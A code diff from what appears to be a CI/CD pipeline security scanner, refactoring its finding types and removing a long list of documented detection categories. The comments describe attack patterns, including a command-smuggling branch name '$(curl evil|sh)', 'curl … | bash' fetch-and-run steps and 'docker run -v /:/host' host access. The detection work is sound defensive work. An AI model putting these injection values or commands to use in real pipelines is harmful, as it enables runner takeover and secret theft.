@@ -1,675 +1,43 @@
-use crate::graph::{AuthorityGraph, NodeId, NodeKind};
-use crate::propagation::PropagationPath;
-use serde::{Deserialize, Serialize};
+//! Finding-engine module for `taudit-core`.
+//!
+//! ## What lives here
+//!
+//! Engine-side logic for findings:
+//!   * [`compute_fingerprint`] — stable cross-run fingerprint (v3, 128-bit).
+//!   * [`compute_finding_group_id`] — UUID v5 over the fingerprint.
+//!   * [`rule_id_for`] — single-source-of-truth rule-id resolver.
+//!   * [`extract_custom_rule_id`] — strict bracketed-id parser used by the above.
+//!
+//! ## What lives in `taudit-api`
+//!
+//! The **wire types** ([`Finding`], [`FindingCategory`], [`Severity`],
+//! [`Recommendation`], [`FindingSource`], [`FixEffort`], [`FindingExtras`])
+//! and the [`downgrade_severity`] helper that operates purely on the
+//! [`Severity`] enum live in `taudit-api`. They are re-exported below so
+//! every existing in-tree call site (`use taudit_core::finding::Finding`)
+//! keeps compiling.
+//!
+//! Symbols marked `#[doc(hidden)]` are required to be `pub` for inter-crate
+//! visibility within this workspace, but are NOT part of the stable contract.
+//! See `taudit-api` for the externally-stable contract surface and
+//! `crates/taudit-core/src/lib.rs` for the API stability docstring.
+
+use crate::graph::{AuthorityGraph, NodeKind};
 use sha2::{Digest, Sha256};
-use std::path::PathBuf;
 
-// ── Finding-output enhancements (v0.10) ────────────────────────────
-//
-// The blue-team corpus defense report (Section 3) recommends a small
-// set of additive `Finding` fields that consumers (SIEMs, dashboards,
-// triage queues) need but cannot derive cheaply. They are:
-//
-//   * `finding_group_id`       — stable UUID v5 over (namespace, fingerprint)
-//                                 so N hops against one secret cluster into
-//                                 a single advisory in downstream tooling.
-//   * `time_to_fix`             — coarse remediation effort enum so triage
-//                                 dashboards can sort by severity * effort.
-//   * `compensating_controls`   — human-readable list of detected controls
-//                                 that downgraded the finding's severity.
-//   * `suppressed`              — set by the `.taudit-suppressions.yml`
-//                                 applicator; preserves audit trail when a
-//                                 finding has been waived rather than fixed.
-//   * `original_severity`       — pre-downgrade severity; populated whenever
-//                                 the suppression applicator OR a compensating
-//                                 control modifies `severity`.
-//   * `suppression_reason`      — operator-supplied justification from the
-//                                 matching `.taudit-suppressions.yml` entry.
-//
-// All six fields live on `FindingExtras` and are flattened into JSON / SARIF
-// output via `#[serde(flatten)]`. New rules can populate them via
-// `Finding::with_time_to_fix(...)` / `Finding::with_compensating_controls(...)`
-// without touching the 31+ existing rule sites.
+// ── Re-exports of wire types (now owned by taudit-api) ─────────────────
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
-pub enum Severity {
-    Critical,
-    High,
-    Medium,
-    Low,
-    Info,
-}
+pub use taudit_api::{
+    downgrade_severity, Finding, FindingCategory, FindingExtras, FindingSource, FixEffort,
+    PropagationPath, Recommendation, Severity,
+};
 
-impl Severity {
-    fn rank(self) -> u8 {
-        match self {
-            Severity::Critical => 0,
-            Severity::High => 1,
-            Severity::Medium => 2,
-            Severity::Low => 3,
-            Severity::Info => 4,
-        }
-    }
-}
+// `NodeId` is re-exported via `crate::graph` (which itself re-exports
+// from taudit-api). The local alias below keeps the original module-level
+// path `taudit_core::finding::NodeId` resolvable for any downstream code.
+pub use taudit_api::NodeId;
 
-impl Ord for Severity {
-    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
-        self.rank().cmp(&other.rank())
-    }
-}
-
-impl PartialOrd for Severity {
-    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
-        Some(self.cmp(other))
-    }
-}
-
-/// MVP categories (1-5) are derivable from pipeline YAML alone.
-/// Stretch categories (6-9) need heuristics or metadata enrichment.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
-pub enum FindingCategory {
-    // MVP
-    AuthorityPropagation,
-    OverPrivilegedIdentity,
-    UnpinnedAction,
-    UntrustedWithAuthority,
-    ArtifactBoundaryCrossing,
-    // Stretch — implemented
-    FloatingImage,
-    LongLivedCredential,
-    /// Credential written to disk by a step (e.g. `persistCredentials: true` on a checkout).
-    /// Disk-persisted credentials are accessible to all subsequent steps and any process
-    /// with filesystem access, unlike runtime-only `HasAccessTo` authority.
-    PersistedCredential,
-    /// Dangerous trigger type (pull_request_target / pr) combined with secret/identity access.
-    TriggerContextMismatch,
-    /// Authority (secret/identity) flows into an opaque external workflow via DelegatesTo.
-    CrossWorkflowAuthorityChain,
-    /// Circular DelegatesTo chain — workflow calls itself transitively.
-    AuthorityCycle,
-    /// Privileged workflow (OIDC/broad identity) with no provenance attestation step.
-    UpliftWithoutAttestation,
-    /// Step writes to the environment gate ($GITHUB_ENV, pipeline variables) — authority can propagate.
-    SelfMutatingPipeline,
-    /// PR-triggered pipeline checks out the repository — attacker-controlled fork code lands on the runner.
-    CheckoutSelfPrExposure,
-    /// ADO variable group consumed by a PR-triggered job, crossing trust boundary.
-    VariableGroupInPrJob,
-    /// Self-hosted agent pool used in a PR-triggered job that also checks out the repository.
-    SelfHostedPoolPrHijack,
-    /// ADO self-hosted pool without workspace isolation (`clean: true`/`all`).
-    /// Shared self-hosted agents retain their workspace across pipeline runs.
-    /// Without `workspace: { clean: all }`, a PR build can deposit malicious
-    /// files that persist for the next (possibly privileged) pipeline run,
-    /// enabling workspace poisoning attacks.
-    SharedSelfHostedPoolNoIsolation,
-    /// Broad-scope ADO service connection reachable from a PR-triggered job without OIDC.
-    ServiceConnectionScopeMismatch,
-    /// ADO `resources.repositories[]` entry referenced by an `extends:`,
-    /// `template: x@alias`, or `checkout: alias` consumer resolves with no
-    /// `ref:` (default branch) or a mutable branch ref (`refs/heads/<name>`).
-    /// Whoever owns that branch can inject steps into the consuming pipeline.
-    TemplateExtendsUnpinnedBranch,
-    /// ADO `resources.repositories[]` entry pinned to a feature-class branch
-    /// (anything outside the `main` / `master` / `release/*` / `hotfix/*`
-    /// platform set). Feature branches typically have weaker push protection
-    /// than the trunk, so any developer with write access to that branch can
-    /// inject pipeline YAML that runs with the consumer's authority. Strictly
-    /// stronger signal than `template_extends_unpinned_branch` — co-fires.
-    TemplateRepoRefIsFeatureBranch,
-    /// Pipeline step uses an Azure VM remote-exec primitive (Set-AzVMExtension /
-    /// CustomScriptExtension, Invoke-AzVMRunCommand, az vm run-command, az vm extension set)
-    /// where the executed command line interpolates a pipeline secret or a SAS token —
-    /// pipeline-to-VM lateral movement primitive logged in plaintext to the VM and ARM.
-    VmRemoteExecViaPipelineSecret,
-    /// A SAS token freshly minted in-pipeline is interpolated into a CLI argument
-    /// (commandToExecute / scriptArguments / --arguments / -ArgumentList) instead of
-    /// passed via env var or stdin — argv ends up in /proc/*/cmdline, ETW, ARM status.
-    ShortLivedSasInCommandLine,
-    /// Pipeline secret value assigned to a shell variable inside an inline
-    /// script (`export VAR=$(SECRET)`, `$X = "$(SECRET)"`). Once the value
-    /// transits a shell variable, ADO's `$(SECRET)` log mask no longer
-    /// applies — transcripts (`Start-Transcript`, `bash -x`, terraform debug
-    /// logs) print the cleartext.
-    SecretToInlineScriptEnvExport,
-    /// Pipeline secret value written to a file under the agent workspace
-    /// (`$(System.DefaultWorkingDirectory)`, `$(Build.SourcesDirectory)`,
-    /// or relative paths) without `secureFile` task or chmod 600. The file
-    /// persists in the agent workspace and is uploaded by
-    /// `PublishPipelineArtifact` and crawlable by later steps.
-    SecretMaterialisedToWorkspaceFile,
-    /// PowerShell pulls a Key Vault secret with `-AsPlainText` (or
-    /// `ConvertFrom-SecureString -AsPlainText`, or older
-    /// `.SecretValueText` syntax) into a non-`SecureString` variable. The
-    /// value never traverses the ADO variable-group boundary, so verbose
-    /// Az/PS logging and error stack traces print the credential.
-    ///
-    /// Rule id is `keyvault_secret_to_plaintext` (single token "keyvault")
-    /// rather than the snake_case derivation `key_vault_…` — matches the
-    /// docs filename and the convention used in the corpus evidence.
-    #[serde(rename = "keyvault_secret_to_plaintext")]
-    KeyVaultSecretToPlaintext,
-    /// `terraform apply -auto-approve` against a production-named service connection
-    /// without an environment approval gate.
-    TerraformAutoApproveInProd,
-    /// `AzureCLI@2` task with `addSpnToEnvironment: true` AND an inline script —
-    /// the script can launder federated SPN/OIDC tokens into pipeline variables.
-    AddSpnWithInlineScript,
-    /// A `type: string` pipeline parameter (no `values:` allowlist) is interpolated
-    /// via `${{ parameters.X }}` into an inline shell/PowerShell script body —
-    /// shell injection vector for anyone with "queue build".
-    ParameterInterpolationIntoShell,
-    /// A `run:` block fetches a remote script from a mutable URL (`refs/heads/`,
-    /// `/main/`, `/master/`) and pipes it directly to a shell interpreter
-    /// (`curl … | bash`, `wget … | sh`, `bash <(curl …)`, `deno run https://…`).
-    /// Whoever controls that URL's content controls execution on the runner.
-    RuntimeScriptFetchedFromFloatingUrl,
-    /// Workflow trigger combines high-authority PR events
-    /// (`pull_request_target`, `issue_comment`, or `workflow_run`) with a step
-    /// whose `uses:` ref is a mutable branch/tag (not a 40-char SHA). Compromise
-    /// of the action's default branch yields full repo write on the target repo.
-    PrTriggerWithFloatingActionRef,
-    /// A `workflow_run`-triggered workflow captures a value from an external
-    /// API response (`gh pr view`, `gh api`, `curl api.github.com`) and writes
-    /// it into `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` without sanitisation.
-    /// A poisoned API field (branch name, title) injects environment variables
-    /// into every subsequent step in the same job.
-    UntrustedApiResponseToEnvSink,
-    /// A `pull_request`-triggered workflow logs into a container registry via a
-    /// floating (non-SHA-pinned) login action. The compromised action receives
-    /// OIDC tokens or registry credentials, and the workflow then pushes a
-    /// PR-controlled image to a shared registry.
-    PrBuildPushesImageWithFloatingCredentials,
-    /// First-party step writes a Secret/Identity-derived value into the
-    /// `$GITHUB_ENV` gate (or pipeline-variable equivalent) and a *later*
-    /// step in the same job that runs in `Untrusted` or `ThirdParty` trust
-    /// zone reads from the runner-managed env (`${{ env.X }}`). The two
-    /// component rules — `self_mutating_pipeline` (writer) and
-    /// `untrusted_with_authority` (consumer) — each see only half the
-    /// chain and emit no finding for the laundered consumer; this rule
-    /// closes the composition gap that R2 attack #3 exploited.
-    SecretViaEnvGateToUntrustedConsumer,
-    /// Positive-invariant rule (GHA): the workflow declares neither a
-    /// top-level nor a per-job `permissions:` block, leaving GITHUB_TOKEN at
-    /// its broad platform default. Fires once per workflow file.
-    NoWorkflowLevelPermissionsBlock,
-    /// Positive-invariant rule (ADO): a job referencing a production-named
-    /// service connection has no `environment:` binding, so it bypasses the
-    /// only ADO-side approval gate regardless of whether `-auto-approve` is
-    /// present. Strictly broader than `terraform_auto_approve_in_prod`.
-    ProdDeployJobNoEnvironmentGate,
-    /// Positive-invariant rule (cross-platform): a long-lived static
-    /// credential is in scope but the workflow does not currently use any
-    /// OIDC identity even though the target cloud supports federation.
-    /// Advisory uplift on top of `long_lived_credential` that wires the
-    /// existing `Recommendation::FederateIdentity` variant.
-    LongLivedSecretWithoutOidcRecommendation,
-    /// Positive-invariant rule (GHA): a PR-triggered workflow has multiple
-    /// privileged jobs where SOME have the standard fork-check `if:` and
-    /// OTHERS do not. Detects an intra-file inconsistency in defensive
-    /// posture — the org has the right instinct but applied it unevenly.
-    PullRequestWorkflowInconsistentForkCheck,
-    /// Positive-invariant rule (GitLab): a job with a production-named
-    /// `environment:` binding has no `rules:` / `only:` clause restricting
-    /// it to protected branches. Deploy job runs (or attempts to run) on
-    /// every pipeline trigger.
-    GitlabDeployJobMissingProtectedBranchOnly,
-    /// Two-step ADO chain: an inline script captures a `terraform output`
-    /// value (literal `terraform output` CLI invocation or a `$env:TF_OUT_*` /
-    /// `$TF_OUT_*` env var sourced from a Terraform CLI task) AND emits a
-    /// `##vso[task.setvariable variable=X;...]` directive setting that
-    /// captured value into pipeline variable `X`. A subsequent step in the
-    /// same job then expands `$(X)` in shell-expansion position
-    /// (`bash -c "..."`, `eval`, command substitution `$(...)`, PowerShell
-    /// `-split` / `Invoke-Command` / `Invoke-Expression`/`iex`, or as an
-    /// unquoted command word). The `task.setvariable` hop launders
-    /// attacker-controlled Terraform state — sourced from a remote backend
-    /// (S3 bucket, Azure Storage) that often has weaker access controls than
-    /// the pipeline itself — through pipeline-variable space and into a
-    /// shell interpreter.
-    TerraformOutputViaSetvariableShellExpansion,
-    /// GHA workflow declares a high-blast-radius trigger (`issue_comment`,
-    /// `pull_request_review`, `pull_request_review_comment`, `workflow_run`)
-    /// alongside write permissions or non-`GITHUB_TOKEN` secrets. Closes the
-    /// gap left by `trigger_context_mismatch` only firing on
-    /// `pull_request_target` / ADO `pr`.
-    RiskyTriggerWithAuthority,
-    /// A `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
-    /// OIDC-bearing step output, or has a credential-shaped name. Job outputs
-    /// flow unmasked through `needs.<job>.outputs.*` and are written to the
-    /// run log — masking is heuristic, never authoritative.
-    SensitiveValueInJobOutput,
-    /// A `workflow_dispatch.inputs.*` value flows into `curl` / `wget` /
-    /// `gh api` / a `run:` URL / `actions/checkout` `ref:`. Anyone with
-    /// dispatch permission can pivot the run to attacker-controlled refs or
-    /// hosts.
-    ManualDispatchInputToUrlOrCommand,
-    /// A reusable workflow call uses `secrets: inherit` while the caller is
-    /// triggered by an attacker-influenced event (`pull_request`,
-    /// `pull_request_target`, `issue_comment`, `workflow_run`). The whole
-    /// caller secret bag forwards to the callee regardless of what the callee
-    /// actually consumes — every transitive `uses:` in the called workflow
-    /// inherits the same scope.
-    SecretsInheritOverscopedPassthrough,
-    /// A `workflow_run`- or `pull_request_target`-triggered consumer
-    /// downloads an artifact from the originating run AND interprets that
-    /// artifact's content into a privileged sink (post-to-comment, write to
-    /// `$GITHUB_ENV`, `eval`, …). The producer ran in PR context, so a
-    /// malicious PR can write arbitrary content into the artifact while the
-    /// consumer holds upstream-repo authority.
-    UnsafePrArtifactInWorkflowRunConsumer,
-    /// A GitHub Actions `run:` block (or `actions/github-script` `script:` body)
-    /// interpolates an attacker-controllable expression — `${{ github.event.* }}`,
-    /// `${{ github.head_ref }}`, or `${{ inputs.* }}` from a privileged trigger
-    /// (`workflow_dispatch` / `workflow_run` / `issue_comment`) — directly into
-    /// the script text without first binding through an `env:` indirection.
-    /// Classic GitHub Actions remote-code-execution pattern.
-    ScriptInjectionViaUntrustedContext,
-    /// A workflow that holds non-`GITHUB_TOKEN` secrets or non-default
-    /// write permissions includes a step that uses an interactive debug action
-    /// (mxschmitt/action-tmate, lhotari/action-upterm, actions/tmate, …).
-    /// A maintainer flipping `debug_enabled=true` publishes the runner's full
-    /// environment over an external SSH endpoint.
-    InteractiveDebugActionInAuthorityWorkflow,
-    /// An `actions/cache` step keys the cache on a PR-derived expression
-    /// (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`)
-    /// in a workflow that ALSO runs on `push: branches: [main]` — a PR can
-    /// poison the cache that the default-branch build later restores.
-    PrSpecificCacheKeyInDefaultBranchConsumer,
-    /// A `run:` step uses `gh ` / `gh api` with the default `GITHUB_TOKEN` to
-    /// perform a write-class action (`pr merge`, `release create/upload`,
-    /// `api -X POST/PATCH/PUT/DELETE` to `/repos/.../{contents,releases,actions/secrets,environments}`)
-    /// inside a workflow triggered by `pull_request`, `issue_comment`, or
-    /// `workflow_run` — runtime privilege escalation that static permission
-    /// checks miss.
-    GhCliWithDefaultTokenEscalating,
-    /// GitLab CI `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) used as a
-    /// bearer credential against an external HTTP API or fed to `docker login`
-    /// for `registry.gitlab.com`. CI_JOB_TOKEN's default scope (registry write,
-    /// package upload, project read) means a poisoned MR job that emits the
-    /// token to a webhook can pivot to package/registry pushes elsewhere.
-    CiJobTokenToExternalApi,
-    /// GitLab CI `id_tokens:` declares an `aud:` audience that is reused across
-    /// MR-context and protected-context jobs (no audience separation), or is a
-    /// wildcard / multi-cloud broker URL. The audience is what trades for
-    /// downstream cloud creds — a single shared `aud` means any job that
-    /// compromises the token assumes the most-privileged role any other job
-    /// uses.
-    IdTokenAudienceOverscoped,
-    /// Direct shell interpolation of attacker-controlled GitLab predefined
-    /// vars (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`,
-    /// `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
-    /// `$CI_MERGE_REQUEST_DESCRIPTION`,
-    /// `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_AUTHOR`) into
-    /// `script:` / `before_script:` / `after_script:` / `environment:url:`
-    /// without single-quote isolation. A branch named `` $(curl evil|sh) ``
-    /// executes inside the runner. GitLab generalisation of the GHA
-    /// `script_injection_via_untrusted_context` class.
-    UntrustedCiVarInShellInterpolation,
-    /// A GitLab `include:` references (a) a `remote:` URL pointing at a
-    /// branch (`/-/raw/<branch>/...`), (b) a `project:` with `ref:` resolving
-    /// to a mutable branch name (main/master/develop), or (c) an include with
-    /// no `ref:` at all (defaults to HEAD). Whoever owns that branch can
-    /// backdoor every consumer's pipeline silently — included YAML executes
-    /// with the consumer's secrets and CI_JOB_TOKEN.
-    UnpinnedIncludeRemoteOrBranchRef,
-    /// A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds
-    /// at least one non-CI_JOB_TOKEN secret (registry creds, deploy keys,
-    /// signing keys, vault id_tokens). docker-in-docker exposes the full
-    /// Docker socket inside the job container — a malicious build step can
-    /// `docker run -v /:/host` from inside dind and read the runner host
-    /// filesystem (other jobs' artifacts, cached creds).
-    DindServiceGrantsHostAuthority,
-    /// A GitLab job whose name or `extends:` matches scanner patterns
-    /// (`sast`, `dast`, `secret_detection`, `dependency_scanning`,
-    /// `container_scanning`, `gitleaks`, `trivy`, `grype`, `semgrep`, etc.)
-    /// runs with `allow_failure: true` AND has no `rules:` clause that
-    /// surfaces the failure. The pipeline goes green even when the scan
-    /// errors out — silent-pass is worse than no scan because reviewers trust
-    /// the badge.
-    SecurityJobSilentlySkipped,
-    /// A GitLab `trigger:` job (downstream / child pipeline) runs in
-    /// `merge_request_event` context OR uses `include: artifact:` from a
-    /// previous job (dynamic child pipeline). Dynamic child pipelines are a
-    /// code-injection sink — anything the build step writes to the artifact
-    /// runs as a real pipeline with the parent project's secrets.
-    ChildPipelineTriggerInheritsAuthority,
-    /// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
-    /// only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction.
-    /// Caches are stored per-runner keyed by `key:`; a poisoned MR can push a
-    /// malicious `node_modules/` cache that the next default-branch job
-    /// downloads and executes during `npm install`.
-    CacheKeyCrossesTrustBoundary,
-    /// A CI script constructs an HTTPS git URL with embedded credentials
-    /// (`https://user:$TOKEN@host/...`) before invoking `git clone`,
-    /// `git push`, or `git remote set-url`. The credential is exposed
-    /// in the process argv (visible to `ps`, `/proc/*/cmdline`), persists
-    /// in `.git/config` for the rest of the job, and may be uploaded as
-    /// part of any artifact that bundles the workspace.
-    PatEmbeddedInGitRemoteUrl,
-    /// A CI job triggers a different project's pipeline via the GitLab
-    /// REST API using `CI_JOB_TOKEN` and forwards user-influenced variables
-    /// through the `variables[KEY]=value` query/form parameter. The
-    /// downstream project's security depends on the trust contract between
-    /// the two projects — variable values flowing across that boundary
-    /// constitute a cross-project authority bridge.
-    CiTokenTriggersDownstreamWithVariablePassthrough,
-    /// A GitLab job emits an `artifacts.reports.dotenv: <file>` artifact
-    /// whose contents become pipeline variables for any consumer linked
-    /// via `needs:` or `dependencies:`. A consumer in a later stage that
-    /// targets a production-named environment inherits those variables
-    /// transparently — no explicit download is visible at the job level.
-    /// When the producer reads attacker-influenced inputs (branch names,
-    /// commit messages), the dotenv flow is a covert privilege escalation
-    /// channel into the deployment job.
-    DotenvArtifactFlowsToPrivilegedDeployment,
-    /// ADO inline script sets a sensitive-named pipeline variable via
-    /// `##vso[task.setvariable variable=<NAME>]` with `issecret=false` or
-    /// without the `issecret` flag at all. Without `issecret=true` the
-    /// variable value is printed in plaintext to the pipeline log and is
-    /// not masked in downstream step output.
-    SetvariableIssecretFalse,
-    /// A GHA `uses:` action reference contains a non-ASCII character —
-    /// possible Unicode confusable / homoglyph impersonating a trusted
-    /// action (e.g. Cyrillic `a` instead of Latin `a`, or U+2215
-    /// DIVISION SLASH instead of U+002F SOLIDUS).
-    HomoglyphInActionRef,
-    // Reserved — requires ADO/GH API enrichment beyond pipeline YAML.
-    // Sealed against deserialisation: a custom-rule YAML using these
-    // categories errors out with `unknown variant` at load time, because
-    // they cannot be detected from pipeline YAML alone. They still
-    // serialise normally so future runtime-enrichment paths inside the
-    // taudit binary can emit them, and the output schemas advertise them.
-    /// Requires runtime network telemetry or policy enrichment — not detectable from YAML alone.
-    #[serde(skip_deserializing)]
-    #[doc(hidden)]
-    EgressBlindspot,
-    /// Requires external audit-sink configuration data — not detectable from YAML alone.
-    #[serde(skip_deserializing)]
-    #[doc(hidden)]
-    MissingAuditTrail,
-}
-
-/// Routing: scope findings -> TsafeRemediation; isolation findings -> CellosRemediation.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-#[serde(tag = "type", rename_all = "snake_case")]
-pub enum Recommendation {
-    TsafeRemediation {
-        command: String,
-        explanation: String,
-    },
-    CellosRemediation {
-        reason: String,
-        spec_hint: String,
-    },
-    PinAction {
-        current: String,
-        pinned: String,
-    },
-    ReducePermissions {
-        current: String,
-        minimum: String,
-    },
-    FederateIdentity {
-        static_secret: String,
-        oidc_provider: String,
-    },
-    Manual {
-        action: String,
-    },
-}
-
-/// Provenance of a finding — distinguishes findings emitted by built-in
-/// taudit rules from findings emitted by user-loaded custom invariant YAML
-/// (`--invariants-dir`). Custom rules can emit arbitrarily-worded findings
-/// at any severity, so an operator piping output into a JIRA workflow or
-/// SARIF upload needs a non-spoofable signal of which file the rule came
-/// from. Serializes as `"built-in"` (string) for built-in findings and
-/// `{"custom": "<path>"}` for custom-rule findings — see
-/// `docs/finding-fingerprint.md` for the contract.
-#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
-pub enum FindingSource {
-    /// Emitted by a built-in rule defined in `taudit-core::rules`. The
-    /// authoritative trust anchor — the binary's release commit defines the
-    /// rule logic. Serialises as the kebab-case string `"built-in"` to match
-    /// `schemas/finding.v1.json`.
-    #[default]
-    #[serde(rename = "built-in")]
-    BuiltIn,
-    /// Emitted by a custom invariant rule loaded from the given YAML file.
-    /// The path is the file the rule was loaded from, retained so operators
-    /// can audit which file produced any given finding.
-    Custom { source_file: PathBuf },
-}
-
-impl FindingSource {
-    /// True for findings emitted by built-in rules.
-    pub fn is_built_in(&self) -> bool {
-        matches!(self, FindingSource::BuiltIn)
-    }
-}
-
-/// Coarse-grained remediation effort. Surfaces in JSON `time_to_fix` and SARIF
-/// `properties.timeToFix` so triage dashboards can sort by `severity * effort`.
-///
-/// The four buckets are deliberately wide. Precise time estimates would invite
-/// argument; the buckets exist to separate "flip a flag" from "rewrite a job"
-/// from "renegotiate ops policy".
-///
-/// Per `MEMORY/.../blueteam-corpus-defense.md` Section 3 / Enhancement E-3.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
-pub enum FixEffort {
-    /// ~5 minutes. Mechanical change to a single file (flip a flag, pin a SHA,
-    /// add a `permissions: {}` block). No structural risk.
-    Trivial,
-    /// ~1 hour. Refactor a step or job: split a script, add a fork-check,
-    /// move a secret to an environment binding.
-    Small,
-    /// ~1 day. Restructure a job or pipeline: introduce an environment gate,
-    /// move from inline scripts to a sandboxed action, add an OIDC role.
-    Medium,
-    /// ~1 week or more. Operational policy change: migrate from PATs to OIDC
-    /// across an org, change branch protection model, retire a service principal.
-    Large,
-}
-
-/// Optional finding metadata. Lives on every `Finding` via
-/// `#[serde(flatten)]` so consumers see the fields at the top of the
-/// finding object — same place they'd appear if declared inline on
-/// `Finding`. Default-constructed extras serialize to nothing (all
-/// `Option::None` and empty `Vec`s skip-serialize), so existing
-/// snapshots remain byte-stable until a rule populates a field.
-///
-/// **Why a wrapper struct?** The 30+ rule call sites use struct
-/// literal syntax. Adding fields directly to `Finding` would force
-/// every site to edit. With `extras: FindingExtras::default()`, new
-/// extras can be added in a single place.
-#[derive(Debug, Clone, Default, Serialize, Deserialize)]
-pub struct FindingExtras {
-    /// Stable UUID v5 over `(NAMESPACE, fingerprint)` — collapses
-    /// per-hop findings against the same authority root into one group
-    /// for SIEM display. See `compute_finding_group_id`.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub finding_group_id: Option<String>,
-
-    /// Coarse remediation effort. See `FixEffort`.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub time_to_fix: Option<FixEffort>,
-
-    /// Human-readable list of controls that already neutralise (or partially
-    /// neutralise) this finding — populated when a compensating-control
-    /// detector downgrades severity. Empty when no downgrade applied.
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
-    pub compensating_controls: Vec<String>,
-
-    /// Set to `true` by the suppression applicator when a matching
-    /// `.taudit-suppressions.yml` entry exists AND the configured mode
-    /// is `Suppress`. The finding still appears in output (audit trail
-    /// preserved) but consumers can filter on this field.
-    #[serde(default, skip_serializing_if = "is_false")]
-    pub suppressed: bool,
-
-    /// Original pre-downgrade severity. Populated by the suppression
-    /// applicator OR a compensating-control detector when `severity`
-    /// is mutated. `None` means the current severity is the rule-emitted
-    /// value.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub original_severity: Option<Severity>,
-
-    /// Operator-supplied justification from the matching suppression
-    /// entry. `None` when no suppression applies.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub suppression_reason: Option<String>,
-
-    /// Per-finding stable anchor mixed into the fingerprint canonical
-    /// string. Populated by rules that have no natural graph node to
-    /// place in `nodes_involved` (e.g. ADO `resources.repositories[]`
-    /// aliases, GitLab `include:` entries, workflow-level invariants).
-    /// When two findings of the same rule fire in the same file, their
-    /// anchors must differ for the fingerprints to differ.
-    ///
-    /// Round-trips through JSON so external tools that recompute
-    /// fingerprints from loaded findings get the same value as the
-    /// emitting taudit run. `None` (the default) and `Some("")` are the
-    /// same equivalence class — both contribute the empty marker to the
-    /// canonical string.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub fingerprint_anchor: Option<String>,
-}
-
-impl FindingExtras {
-    /// Convenience constructor for the common case of "default extras
-    /// plus a per-finding fingerprint anchor". Used by rules whose
-    /// emission sites have no natural graph-node anchor and need the
-    /// anchor to discriminate multiple findings of the same rule in one
-    /// file (see `compute_fingerprint` v3 contract).
-    pub fn with_anchor(anchor: impl Into<String>) -> Self {
-        Self {
-            fingerprint_anchor: Some(anchor.into()),
-            ..Self::default()
-        }
-    }
-}
-
-#[allow(clippy::trivially_copy_pass_by_ref)]
-fn is_false(b: &bool) -> bool {
-    !*b
-}
-
-/// A finding is a concrete, actionable authority issue.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Finding {
-    pub severity: Severity,
-    pub category: FindingCategory,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub path: Option<PropagationPath>,
-    pub nodes_involved: Vec<NodeId>,
-    pub message: String,
-    pub recommendation: Recommendation,
-    /// Provenance of this finding. Defaults to `BuiltIn` for backward
-    /// compatibility with code/JSON that predates the field — every
-    /// in-tree built-in rule sets this explicitly. Deserialization of older
-    /// JSON without the field treats the finding as built-in.
-    #[serde(default)]
-    pub source: FindingSource,
-    /// Optional metadata (group id, time-to-fix, compensating controls,
-    /// suppression markers). Flattens into the JSON object so consumers
-    /// see top-level fields — see `FindingExtras` for individual semantics.
-    #[serde(flatten, default)]
-    pub extras: FindingExtras,
-}
-
-impl Finding {
-    /// Builder helper: attach a `time_to_fix` annotation to this finding.
-    /// Call sites: `let f = Finding { ... }.with_time_to_fix(FixEffort::Trivial);`
-    pub fn with_time_to_fix(mut self, effort: FixEffort) -> Self {
-        self.extras.time_to_fix = Some(effort);
-        self
-    }
-
-    /// Builder helper: append a compensating control description and
-    /// downgrade severity by one tier (Critical -> High -> Medium -> Low -> Info).
-    /// Records the original severity so the audit trail survives.
-    pub fn with_compensating_control(mut self, control: impl Into<String>) -> Self {
-        let original = self.severity;
-        self.extras.compensating_controls.push(control.into());
-        self.severity = downgrade_severity(self.severity);
-        if self.extras.original_severity.is_none() {
-            self.extras.original_severity = Some(original);
-        }
-        self
-    }
-}
-
-/// Move severity one rank toward `Info` (Critical -> High -> ... -> Info).
-/// `Info` stays `Info`. Used by both the suppression applicator and
-/// compensating-control detectors.
-///
-/// **API stability:** marked `#[doc(hidden)]` because `taudit-core` is a
-/// workspace-internal library. See `crates/taudit-core/src/lib.rs`.
-#[doc(hidden)]
-pub fn downgrade_severity(s: Severity) -> Severity {
-    match s {
-        Severity::Critical => Severity::High,
-        Severity::High => Severity::Medium,
-        Severity::Medium => Severity::Low,
-        Severity::Low => Severity::Info,
-        Severity::Info => Severity::Info,
-    }
-}
-
-/// Stable UUID v5 over the finding fingerprint. Two findings whose
-/// fingerprints match (same rule + file + root authority) produce the
-/// same `finding_group_id` — that is the whole point: SIEMs and triage
-/// dashboards collapse N hops against a single secret into one row.
-///
-/// The UUID v5 namespace is a fixed UUID v4 derived once and embedded
-/// here. Treating the namespace as load-bearing is intentional: any
-/// future change here would break every consumer that has stored a
-/// `finding_group_id`. Bump only at a major version.
-///
-/// **API stability:** marked `#[doc(hidden)]` because `taudit-core` is a
-/// workspace-internal library. External consumers should read the
-/// `finding_group_id` field from the JSON / SARIF / CloudEvents output.
-#[doc(hidden)]
